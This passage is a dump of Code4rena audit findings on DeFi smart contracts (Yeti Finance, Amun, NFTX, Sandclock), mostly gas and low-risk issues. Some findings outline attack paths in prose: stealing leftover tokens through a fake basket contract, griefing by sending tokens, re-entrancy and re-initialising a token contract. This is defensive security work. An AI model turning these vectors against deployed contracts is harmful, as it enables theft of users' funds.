SortedTroves.sol, In line 230, Require message length to shorten: 34, The message: SortedTroves: ICR must be positive         Solidity file: StabilityPool.sol, In line 1076, Require message length to shorten: 39, The message: StabilityPool: Caller is not ActivePool         Solidity file: StabilityPool.sol, In line 1095, Require message length to shorten: 40, The message: StabilityPool: User must have no deposit         Solidity file: StabilityPool.sol, In line 1099, Require message length to shorten: 38, The message: StabilityPool: Amount must be non-zero         Solidity file: StabilityPool.sol, In line 1138, Require message length to shorten: 36, The message: DefaultPool: Caller is not whitelist         Solidity file: SortedTrovesTester.sol, In line 23, Require message length to shorten: 34, The message: SortedTroves: ICR must be positive         Solidity file: TroveManagerLiquidations.sol, In line 180, Require message length to shorten: 34, The message: TroveManager: nothing to liquidate         Solidity file: TroveManagerRedemptions.sol, In line 520, Require message length to shorten: 34, The message: must be non zero redemption amount         Solidity file: CommunityIssuance.sol, In line 131, Require message length to shorten: 35, The message: CommunityIssuance: caller is not SP         Solidity file: YETIToken.sol, In line 198, Require message length to shorten: 36, The message: YETI: transfer from the zero address         Solidity file: YETIToken.sol, In line 222, Require message length to shorten: 39, The message: YETI: caller must be the SYETI contract         Solidity file: YUSDToken.sol, In line 294, Require message length to shorten: 37, The message: YUSD: Caller is not the StabilityPool  "}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-yetifinance-findings/issues/2", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-yetifinance-findings", "body": "# Handle  robee   # Vulnerability details  In the following files there are contract imports that aren't used.  Import of unnecessary files costs deployment gas (and is a bad coding practice that is important to ignore).  The following is a full list of all unused imports, we went through the whole code to find it :) <solidity file> <line number> <actual import line>:           ActivePool.sol, line 6, import \"./Interfaces/IStabilityPool.sol\";         ActivePool.sol, line 7, import \"./Interfaces/IDefaultPool.sol\";         ActivePool.sol, line 13, import \"./Dependencies/LiquityBase.sol\";         ERC20_8.sol, line 3, import \"./Interfaces/IERC20_8.sol\";         IMasterChefJoeV2.sol, line 1, import \"./IERC20_8.sol\";         IRewarder.sol, line 3, import \"./IERC20_8.sol\";         LiquityBase.sol, line 8, import \"../Interfaces/IWhitelist.sol\";         TroveManagerBase.sol, line 12, import \"../Interfaces/IWhitelist.sol\";         Whitelist.sol, line 13, import \"../Interfaces/IERC20.sol\";         Whitelist.sol, line 14, import \"./LiquityMath.sol\";         YetiCustomBase.sol, line 6, import \"../Interfaces/IERC20.sol\";         ICollSurplusPool.sol, line 4, import \"../Dependencies/YetiCustomBase.sol\";         ILiquityBase.sol, line 4, import \"./IPriceFeed.sol\";         MockAggregator.sol, line 5, import \"hardhat/console.sol\";         NonPayable.sol, line 4, //import \"hardhat/console.sol\";         SortedTrovesTester.sol, line 4, import \"../Interfaces/ISortedTroves.sol\";         TroveManagerLiquidations.sol, line 6, import \"hardhat/console.sol\";         sYETIToken.sol, line 9, import \"./BoringCrypto/BoringBatchable.sol\";  "}, {"title": "unsponsor, claimYield and withdraw might fail unexpectadly", "html_url": "https://github.com/code-423n4/2022-01-sandclock-findings/issues/76", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "sponsor vault"], "target": "2022-01-sandclock-findings", "body": "# Handle  danb   # Vulnerability details  `totalUnderlying()` includes the invested assets, they are not in the contract balance.  when a user calls withdraw, claimYield or unsponsor, the system might not have enough assets in the balance and the transfer would fail.  especially, force unsponsor will always fail, because it tries to transfer the entire `totalUnderlying()`, which the system doesn't have:  https://github.com/code-423n4/2022-01-sandclock/blob/main/sandclock/contracts/Vault.sol#L391   ## Recommended Mitigation Steps when the system doesn't have enough balance to make the transfer, withdraw from the strategy.  "}, {"title": "token.approve() doesn\u2019t check return value", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/294", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  sirhashalot   # Vulnerability details  ## Impact  Multiple files within the contracts/basket/contracts/singleJoinExit/ directory call `token.approve()` for an ERC20 token, but these calls do not verify whether the `approve()` call failed. Some ERC20 tokens do not revert if an approval fails, and because the return value is not checked, the contract would not be aware of this failure, potentially causing malfunctions in later operations. Using a function from SafeERC20 that checks the return value would mitigate this edge case.  ## Proof of Concept  token.approve() is found in several locations: - singleJoinExit/SingleTokenJoin.sol [line 43](https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/SingleTokenJoin.sol#L43) - singleJoinExit/SingleNativeTokenExitV2.sol [line 55](https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/SingleNativeTokenExitV2.sol#L55) - singleJoinExit/SingleNativeTokenExit.sol [line 44](https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/SingleNativeTokenExit.sol#L44) - singleJoinExit/SingleTokenJoinV2.sol [line 53](https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/SingleTokenJoinV2.sol#L53)  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  While the OpenZeppelin SafeERC20 `safeApprove()` function could be used to revert on approve failures unlike the standard `approve()`, the `safeApprove()` function [is deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/5ac4d93ae318cdf6c8a1125dff3a439a2aeabb63/contracts/token/ERC20/utils/SafeERC20.sol#L39-L44) and instead OpenZeppelin recommends either `safeIncreaseAllowance()` or `safeDecreaseAllowance()`. Because uint256(-1) should be an increase, replace each instance of `token.approve(spender, uint256(-1))` with `token.safeIncreaseAllowance(spender, uint256(-1))`.  "}, {"title": "uniSwapLikeRouter or swap.exchange", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/286", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Contracts SingleTokenJoinV2 and SingleNativeTokenExitV2 initialize uniSwapLikeRouter, but never actually use it, as swap.exchange is used instead. So it basically trusts the user input. Consider removing uniSwapLikeRouter if that was the intention to save some gas.  "}, {"title": "It is possible to \"uninitialize\" `ERC20Facet` contract", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/276", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact The initialization status is defined by the [name and symbol](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/ERC20/ERC20Facet.sol#L25-L28). It is possible it set them back to an empty string, uninitializing the contract and letting the `initialize(..)` function be called again. This way, the owner may, for example, hide minting additional tokens. Or, after accidentally setting name and symbol to empty strings, anyone can take control over the contract and mint any number of tokens.  In general, it shouldn't be possible to initialize more than once.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  Consider adding empty string checks in `setName(...)` and `setSymbol(...)` functions.   "}, {"title": "mint and burn of PolygonERC20Wrapper", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/275", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact I am sorry if I incorrectly understood the intentions of contract PolygonERC20Wrapper but the comments and the code do not align here:  Function deposit:   \"Should handle deposit by minting the required amount for user. Make sure minting is done only by this function\". However, the code does not perform any minting and just transfers the underlying tokens to the user.  On the other hand, functions withdraw and withdrawTo state:   \"Should burn user's tokens\"  but it actually performs both, minting and burning: ```solidity   _mint(recipient, amount);   _burn(recipient, amount); ```  ## Recommended Mitigation Steps I was late to verify this with the sponsor, so make sure this is the intended behavior, and update comments to match the codebase.  "}, {"title": "Call function internally instead of externally", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/270", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  Czar102   # Vulnerability details  ## Impact To save gas it is recommended it call function internally, if possible.  ## Proof of Concept Function [`BasketFacet::getLock()`](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L282-L286) is defined externally and calls from [`BasketFacet::joinPool(...)`](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L148) and [`BasketFacet::exitPool(...)`](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L194) are not internal, but message calls.  The same applies to function [`BasketFacet::getCap()`](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L328-L330) usage in [`BasketFacet::joinPool(...)`](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L154).  ## Recommended Mitigation Steps Consider changing visibility of `BasketFacet::getLock()` to public and calling the above function internally. Alternative solution shall be implemented with `BasketFacet::getCap()`.   "}, {"title": "Unchecked return value from  low-level call()", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/237", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  JMukesh   # Vulnerability details  ## Impact The return value of the low-level call is not checked, so if the call fails, the Ether will be locked in the contract. If the low level is used to prevent blocking operations, consider logging failed calls.  ## Proof of Concept  https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/EthSingleTokenJoinV2.sol#L26  ## Tools Used  manual review  ## Recommended Mitigation Steps  add condition to check return value   "}, {"title": "Remove unnecessary variables can make the code simpler and save some gas", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/214", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/singleJoinExit/SingleTokenJoin.sol#L51-L57  ```solidity IERC20 inputToken = IERC20(_joinTokenStruct.inputToken);  inputToken.safeTransferFrom(     msg.sender,     address(this),     _joinTokenStruct.inputAmount ); ```  `inputToken` is unnecessary as it's being used only once. Can be changed to:  ```solidity IERC20(_joinTokenStruct.inputToken).safeTransferFrom(     msg.sender,     address(this),     _joinTokenStruct.inputAmount ); ```  "}, {"title": "Unused ERC20 tokens are not refunded, and can be stolen by attacker", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/201", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  WatchPug   # Vulnerability details  Under certain circumstances, e.g. `annualizedFee` being minted to `feeBeneficiary` between the time user sent the transaction and the transaction being packed into the block and causing amounts of underlying tokens for each basketToken to decrease. It's possible or even most certainly that there will be some leftover basket underlying tokens, as `BasketFacet.sol#joinPool()` will only transfer required amounts of basket tokens from Join contracts.  However, in the current implementation, only the leftover inputToken is returned.  As a result, the leftover underlying tokens won't be returned to the user, which constitutes users' fund loss.  https://github.com/code-423n4/2021-12-amun/blob/cf890dedf2e43ec787e8e5df65726316fda134a1/contracts/basket/contracts/singleJoinExit/SingleTokenJoinV2.sol#L57-L78  ```solidity function joinTokenSingle(JoinTokenStructV2 calldata _joinTokenStruct)     external {     // ######## INIT TOKEN #########     IERC20 inputToken = IERC20(_joinTokenStruct.inputToken);      inputToken.safeTransferFrom(         msg.sender,         address(this),         _joinTokenStruct.inputAmount     );      _joinTokenSingle(_joinTokenStruct);      // ######## SEND TOKEN #########     uint256 remainingIntermediateBalance = inputToken.balanceOf(         address(this)     );     if (remainingIntermediateBalance > 0) {         inputToken.safeTransfer(msg.sender, remainingIntermediateBalance);     } } ```  https://github.com/code-423n4/2021-12-amun/blob/cf890dedf2e43ec787e8e5df65726316fda134a1/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L143-L168  ```solidity function joinPool(uint256 _amount, uint16 _referral)     external     override     noReentry {     require(!this.getLock(), \"POOL_LOCKED\");     chargeOutstandingAnnualizedFee();     LibBasketStorage.BasketStorage storage bs =         LibBasketStorage.basketStorage();     uint256 totalSupply = LibERC20Storage.erc20Storage().totalSupply;     require(         totalSupply.add(_amount) <= this.getCap(),         \"MAX_POOL_CAP_REACHED\"     );      uint256 feeAmount = _amount.mul(bs.entryFee).div(10**18);      for (uint256 i; i < bs.tokens.length; i++) {         IERC20 token = bs.tokens[i];         uint256 tokenAmount =             balance(address(token)).mul(_amount.add(feeAmount)).div(                 totalSupply             );         require(tokenAmount != 0, \"AMOUNT_TOO_SMALL\");         token.safeTransferFrom(msg.sender, address(this), tokenAmount);     }     ... ```  Furthermore, the leftover tokens in the `SingleTokenJoinV2` contract can be stolen by calling `joinTokenSingle()` with fake `outputBasket` contract and `swap.exchange` contract.  ### Recomandation  Consider changing to:   1. Calling `IBasketFacet.calcTokensForAmount()` first and only swap for exactly the desired amounts of tokens (like `SingleTokenJoin.sol`); 2. Or, refund leftover tokens.  "}, {"title": "Don't use transfer()", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/175", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  GiveMeTestEther   # Vulnerability details  ## Impact Use of transfer() might render ETH impossible to withdraw becuase after istanbul hardfork , there is increases in the gas cost of the SLOAD operation and therefore breaks some existing smart contracts.Those contracts will break because their fallback functions used to consume less than 2300 gas, and they\u2019ll now consume more, since 2300 the amount of gas a contract\u2019s fallback function receives if it\u2019s called via Solidity\u2019s transfer() or send() methods. Any smart contract that uses transfer() or send() is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.  https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Proof of Concept  2021-12-amun\\contracts\\basket\\contracts\\singleJoinExit\\EthSingleTokenJoin.sol: msg.sender.transfer(remainingIntermediateBalance);  2021-12-amun\\contracts\\basket\\contracts\\singleJoinExit\\EthSingleTokenJoinV2.sol: msg.sender.transfer(remainingIntermediateBalance);  2021-12-amun\\contracts\\basket\\contracts\\singleJoinExit\\SingleNativeTokenExit.sol: msg.sender.transfer(intermediateTokenBalance);  2021-12-amun\\contracts\\basket\\contracts\\singleJoinExit\\SingleNativeTokenExitV2.sol: msg.sender.transfer(intermediateTokenBalance);.  ## Tools Used Manual Analysis  ## Recommended Mitigation Steps -use call() to send ETH  "}, {"title": "Lost annualized fees due to early division", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/155", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  kenzo   # Vulnerability details  An early division in `calcOutStandingAnnualizedFee` will lose accuracy of the fees calculation.  ## Impact Lost fees for the protocol.  ## Proof of Concept `calcOutStandingAnnualizedFee` uses the following formula to calculate the fees: [(Code ref)](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L259:#L262) ``` return             totalSupply.mul(annualizedFee).div(10**18).mul(timePassed).div(                 365 days             ); ```  Since it is dividing by 10**18 in the middle of the calculation, the remainder of that division will be lost. This is why in Solidity, division should come in the end.  ## Recommended Mitigation Steps Move `div(10**18)` to the end of the calculation.  By the way, you might wanna consider changing your fee structure to a smaller basis. Making the base 1e18 gives you granularity that you might not need. For example, if the annualized fee is planned to be 1%, instead of it being 1e15 out of 1e18 it can be 100 out of 10000. This will help prevent overflow if that was the reason you chose to divide in the midst of the calculation.  "}, {"title": "Possible Re-entrancy", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/116", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  In the contract there is no re-entrancy mitigations. Contracts interact with various outside sources (tokens, aave pools, other possible strategies that may be added in the future, etc). so, for instance, now you have to be careful and do not allow tokens that have a receiver callback (e.g. erc777) or untrustable sources of yield (strategies).   ## Proof of Concept  1. Navigate to the following contract functions. (https://github.com/code-423n4/2021-12-amun/blob/cf890dedf2e43ec787e8e5df65726316fda134a1/contracts/basket/contracts/singleJoinExit/EthSingleTokenJoin.sol#L26)  ```          // ######## Wrap TOKEN #########         address(INTERMEDIATE_TOKEN).call{value: msg.value}(\"\");          _joinTokenSingle(_joinTokenStruct);          uint256 remainingIntermediateBalance = INTERMEDIATE_TOKEN.balanceOf(             address(this)         );         if (remainingIntermediateBalance > 0) {             IWrappedNativeToken(address(INTERMEDIATE_TOKEN)).withdraw(                 remainingIntermediateBalance             );             msg.sender.transfer(remainingIntermediateBalance);         }  ```  2. The contract does not follow Check Effect Interaction Pattern. It is vulnerable to re-entrancy.    3. Locations  ``` https://github.com/code-423n4/2021-12-amun/blob/cf890dedf2e43ec787e8e5df65726316fda134a1/contracts/basket/contracts/singleJoinExit/EthSingleTokenJoin.sol#L26  https://github.com/code-423n4/2021-12-amun/blob/cf890dedf2e43ec787e8e5df65726316fda134a1/contracts/basket/contracts/singleJoinExit/EthSingleTokenJoinV2.sol#L26  ```   ## Tools Used  None  ## Recommended Mitigation Steps  Consider using ReentrancyGuard on main action functions: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol  "}, {"title": "++i is more gas efficient than i++ in loops forwarding", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/108", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  ++i is more gas efficient than i++ in loops forwarding.  ## Proof of Concept  1. Navigate to the following contracts.  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/callManagers/RebalanceManager.sol#L218\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/callManagers/RebalanceManager.sol#L234\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/callManagers/RebalanceManagerV2.sol#L155\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/callManagers/RebalanceManagerV3.sol#L166\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/factories/PieFactoryContract.sol#L88\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Call/CallFacet.sol#L55\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L50\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L160\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L321\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L348\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/facets/Basket/BasketFacet.sol#L381\"  \"https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/singleJoinExit/SingleNativeTokenExit.sol#L69\"   ## Tools Used  Code Review  ## Recommended Mitigation Steps  It is  recommend to use unchecked{++i} and change i declaration to uint256.  "}, {"title": "Function `joinTokenSingle` in `SingleTokenJoin.sol` and `SingleTokenJoinV2.sol` can be made to fail", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/81", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  pmerkleplant   # Vulnerability details  ## Impact  There's a griefing attack vulnerability in the function `joinTokenSingle` in  `SingleTokenJoin.sol` as well as `SingleTokenJoinV2.sol` which makes any user transaction fail with \"FAILED_OUTPUT_AMOUNT\".  ### Proof of Concept  The `JoinTokenStruct` argument for `joinTokenSingle` includes a field `outputAmount` to indicate the amount of tokens the user should receive after joining a basket (see line [135](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/singleJoinExit/SingleTokenJoin.sol#L135) and [130](https://github.com/code-423n4/2021-12-amun/blob/main/contracts/basket/contracts/singleJoinExit/SingleTokenJoinV2.sol#L130)).  However, this amount is compared to the contract's balance of the token and reverts if the amount is unequal.  If an attacker sends some amount of a basket's token to the contract, every call to this function will fail as long as the output token equals the attacker's token send.  ## Recommended Mitigation Steps  Refactor the `require` statement to expect at least the `outputAmount` of tokens, i.e. `require(outputAmount >= _joinTokenStruct.outputAmount)`.  "}, {"title": "Failed transfer with low level call could be overlooked", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/78", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  harleythedog   # Vulnerability details  ## Impact The `CallFacet.sol` contract has the function `_call` : ``` function  _call(  address  _target,  bytes  memory  _calldata,  uint256  _value ) internal {  require(address(this).balance >= _value, \"ETH_BALANCE_TOO_LOW\");  (bool success, ) = _target.call{value: _value}(_calldata);  require(success, \"CALL_FAILED\");  emit  Call(msg.sender, _target, _calldata, _value); } ``` This function is utilized in a lot of different places. According to the [Solidity docs]([https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions](https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions)), \"The low-level functions `call`, `delegatecall` and `staticcall` return `true` as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed\".      As a result, it is possible that this call will not work but `_call` will not notice anything went wrong. It could be possible that a user is interacting with an exchange or token that has been deleted, but `_call` will not notice that something has gone wrong and as a result, ether can become stuck in the contract. For this reason, it would be better to also check for the contract's existence prior to executing `_target.call`.   For reference, see a similar high severity reported in a Uniswap audit here (report # 9): https://github.com/Uniswap/v3-core/blob/main/audits/tob/audit.pdf    ## Proof of Concept See `_call` here: https://github.com/code-423n4/2021-12-amun/blob/98f6e2ff91f5fcebc0489f5871183566feaec307/contracts/basket/contracts/facets/Call/CallFacet.sol#L108.  ## Tools Used Inspection  ## Recommended Mitigation Steps To ensure tokens don't get stuck in edge case where user is interacting with a deleted contract, make sure to check that contract actually exists before calling it.   "}, {"title": "State variables that could be set immutable", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/18", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  robee   # Vulnerability details  In the following files there are state variables that could be set immutable to save gas.  The list of format <solidity file>, <state variable name that could be immutable>:           basket in RebalanceManagerV2.sol         uniSwapLikeRouter in SingleNativeTokenExit.sol         INTERMEDIATE_TOKEN in SingleNativeTokenExit.sol         uniSwapLikeRouter in SingleNativeTokenExitV2.sol         INTERMEDIATE_TOKEN in SingleNativeTokenExitV2.sol         uniSwapLikeRouter in SingleTokenJoin.sol         INTERMEDIATE_TOKEN in SingleTokenJoin.sol         uniSwapLikeRouter in SingleTokenJoinV2.sol         INTERMEDIATE_TOKEN in SingleTokenJoinV2.sol         predicateProxy in MintableERC20.sol         underlying in PolygonERC20Wrapper.sol         childChainManager in PolygonERC20Wrapper.sol  "}, {"title": "Use of floating pragmas", "html_url": "https://github.com/code-423n4/2021-12-amun-findings/issues/6", "labels": ["bug", "0 (Non-critical)", "sponsor confirmed"], "target": "2021-12-amun-findings", "body": "# Handle  jayjonah8   # Vulnerability details  ## Impact Floating pragmas are used throughout the codebase.  Contracts should be deployed with the same compiler version that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated or different compiler version that might introduce bugs that affect the contract system negatively.  ## Proof of Concept https://swcregistry.io/docs/SWC-103  Floating pragmas are used throughout the protocol   ## Tools Used Manual code review   ## Recommended Mitigation Steps pragma solidity 0.7.5;  should be used in all files instead of  pragma solidity ^0.7.5; The pragma version should be locked on a specific version while considering know bugs for the chosen compiler version.    "}, {"title": "NFTXMarketplaceZap: incorrect parameter name", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/228", "labels": ["bug", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  In the function `_sellVaultTokenETH`, the parameter `minWethOut` should be `minEthOut`  ## Recommended Mitigation Steps  Replace `minWethOut` with `minEthOut`  "}, {"title": "NFTXStakingZap: Sanity checks on \u201cto\u201d (dest) address", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/227", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  The MarketplaceZap contract conducts a sanity check on the `to` address. One can therefore expect that this check is in place for the StakingZap contract as well.  We also suggest adding another check to ensure that the `to` address is not the StakingZap contract itself. Although there is a `rescue()` function to retrieve funds in these cases, it would be a hassle to do so.   ## Recommended Mitigation Steps  Include the sanity check(s) of the `to` address in the `addLiquidity*()` functions.  ```jsx require(to != address(0) && to != address(this)); ```  "}, {"title": "NFTXMarketplaceZap: Add rescue() function", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/226", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  A `rescue()` function exists for the StakingZap contract to help retrieve any accidental fund transfer to it. It would be beneficial to have this function exist in the MarketplaceZap contract too.  ## Recommended Mitigation Steps  Include the `rescue()` function.  ```jsx function rescue(address token) external onlyOwner {  IERC20Upgradeable(token).transfer(msg.sender, IERC20Upgradeable(token).balanceOf(address(this))); } ```  "}, {"title": "NFTXMarketplaceZap: Restrict native ETH transfers to WETH contract", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/224", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  Native fund transfers into the zap contract are only expected from the WETH contract. Hence, it would be good to restrict incoming fund transfers to prevent accidental native fund transfers from other sources.  This is also true even though `sushiRouter.swapExactTokensForETH()` is called, as the recipient of the swap is expected to not be the marketplace zap contract.  ## Recommended Mitigation Steps  Modify the `receive()` function to only accept transfers from the wrapped token contract.  ```jsx receive() external payable {   require(msg.sender == address(WETH), \"Only WETH\"); } ```  "}, {"title": "NFTXSimpleFeeDistributor: Inconsistency between implementation and comment", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/222", "labels": ["bug", "1 (Low Risk)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  In the `_sendForReceiver()` function, there are 2 comments: `// If the receive is not properly processed, send it to the treasury instead.`   and  `// If the allowance has not been spent, it means we can pass it forward to next`  which are contradictory in nature, except for the case of the last receiver in the feeReceivers array.  Looking at the `distribute()` function implementation, should the `receiveRewards()` function return false, fail, or if the `transferFrom()` was not called in its implementation, the rewards will be given to the next receiver, and not the treasury.  ```jsx // Note: some irrelevant lines were omitted for (uint256 i = 0; i < length; i++) {   uint256 amountToSend = leftover + ((tokenBalance * _feeReceiver.allocPoint) / allocTotal);   bool complete = _sendForReceiver(_feeReceiver, vaultId, _vault, amountToSend);   if (!complete) {     leftover = amountToSend;   } else {     leftover = 0;  } } ```  ## Recommended Mitigation Steps  Based on the implementation, the comment `// If the receive is not properly processed, send it to the treasury instead.` should be edited or removed.  "}, {"title": "NFTXLPStaking: Implementation Upgrade Storage Layout Caution", "html_url": "https://github.com/code-423n4/2021-12-nftx-findings/issues/220", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2021-12-nftx-findings", "body": "# Handle  GreyArt   # Vulnerability details  ## Impact  From what we understand, the contracts upgrade will be performed in place, where the relevant current proxies will be pointing to the new implementations. An important restriction when doing so is that the order of which the contract state variables are declared, and their types **must be preserved.** More information can be found in [OpenZeppelin\u2019s documentation](https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#modifying-your-contracts).  For the NFTXLPStaking contract, the [version of the May contest review](https://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol) was:  ```jsx contract NFTXLPStaking is OwnableUpgradeable {     using SafeERC20Upgradeable for IERC20Upgradeable;      INFTXVaultFactory public nftxVaultFactory;     INFTXFeeDistributor public feeDistributor;     RewardDistributionTokenUpgradeable public rewardDistTokenImpl;     StakingTokenProvider public stakingTokenProvider;      event PoolCreated(uint256 vaultId, address pool);     event PoolUpdated(uint256 vaultId, address pool);     event FeesReceived(uint256 vaultId, uint256 amount);      struct StakingPool {         address stakingToken;         address rewardToken;     }     mapping(uint256 => StakingPool) public vaultStakingInfo;      function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer { ... ```  while the new version is  ```jsx contract NFTXLPStaking is PausableUpgradeable {     using SafeERC20Upgradeable for IERC20Upgradeable;      INFTXVaultFactory public nftxVaultFactory;     IRewardDistributionToken public rewardDistTokenImpl;     StakingTokenProvider public stakingTokenProvider;      event PoolCreated(uint256 vaultId, address pool);     event PoolUpdated(uint256 vaultId, address pool);     event FeesReceived(uint256 vaultId, uint256 amount);      struct StakingPool {         address stakingToken;         address rewardToken;     }     mapping(uint256 => StakingPool) public vaultStakingInfo;      TimelockRewardDistributionTokenImpl public newTimelockRewardDistTokenImpl;      function __NFTXLPStaking__init(address _stakingTokenProvider) external initializer { ... ```  Note that the `feeDistributor` has been removed. Also note that a new base contract has been added (`PausableUpgradeable` which inherits `OwnableUpgradeable`), which has 2 mappings `isGuardian` and `isPaused`.   We however note that the current `NFTXLPStaking` 